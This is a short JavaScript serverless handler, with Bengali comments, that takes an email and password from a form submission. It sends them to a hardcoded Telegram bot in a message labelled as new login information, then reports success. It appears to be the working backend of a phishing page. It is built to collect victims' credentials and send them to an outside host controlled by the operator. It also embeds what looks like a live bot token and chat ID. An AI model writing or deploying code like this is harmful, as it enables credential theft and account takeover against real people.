export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, password } = req.body;

    // এখানে তোমার টেলিগ্রাম বটের টোকেন আর Chat ID বসাও
    const BOT_TOKEN = '8700677708:AAFwyE6X_9wSiHnJeqaIrQ5h5UTT7AcfEGg';
    const CHAT_ID = '8928919290';

    const message = `🔔 নতুন লগইন তথ্য:\n\n📧 Email: ${email}\n🔑 Password: ${password}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        const data = await response.json();

        if (response.ok) {
            return res.status(200).json({ success: true });
        } else {
            // যদি টেলিগ্রাম এরর দেয়, সেটা আমরা দেখতে পাব
            return res.status(500).json({ 
                error: 'Telegram error', 
                details: data 
            });
        }
    } catch (error) {
        return res.status(500).json({ 
            error: 'Server error', 
            message: error.message 
        });
    }
        }
